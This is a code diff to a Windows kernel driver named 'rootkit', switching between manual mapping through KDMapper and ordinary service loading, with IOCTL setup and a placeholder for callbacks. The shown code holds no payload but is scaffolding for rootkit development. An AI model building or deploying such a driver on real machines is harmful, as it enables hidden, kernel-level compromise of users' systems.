@@ -3,6 +3,10 @@
 #pragma warning(push)
 #pragma warning(disable: 4100)  // Unreferenced formal parameter
 #pragma warning(disable : 4099)
+// #define DRL // Uncomment if you want to reflectively load the driver.
+#ifndef DRL
+#define DL
+#endif
 // debug printing
 void debug_print(PCSTR text) {
     KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, text));
@@ -398,6 +402,10 @@ NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path)
 
     debug_print("[+] Driver symbolic link creation successful.\n");
 
+#ifdef DL // If the driver is loaded via a service and not reflectively, register callbacks.
+    // THIS IS PLANNED.
+#endif
+
     // Setup IOCTL Comm.
     // Allow us to send small amounts of data between user-mode/kernel-mode
     SetFlag(device_object->Flags, DO_BUFFERED_IO);
@@ -414,11 +422,21 @@ NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path)
     return status;
 }
 
-NTSTATUS DriverEntry() {
+NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
     debug_print("[+] DriverEntry called\n");
 
     UNICODE_STRING driver_name = {};
     RtlInitUnicodeString(&driver_name, L"\\Driver\\rootkit");
-
+    /*
+	In a normal driver, we wouldn't do IoCreateDriver, since this is manual mapping (using KDMapper), we need to use this function to create the driver.
+    But if this is used as a service in windows, Windows already does this for us, meaning all of the code in DriverMain above will exist here in DriverEntry.
+    */
+#ifdef DRL
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+    debug_print("Driver is reflectively loaded\n");
     return IoCreateDriver(&driver_name, &DriverMain);
+#else
+    return DriverMain(DriverObject, RegistryPath);
+#endif
 }
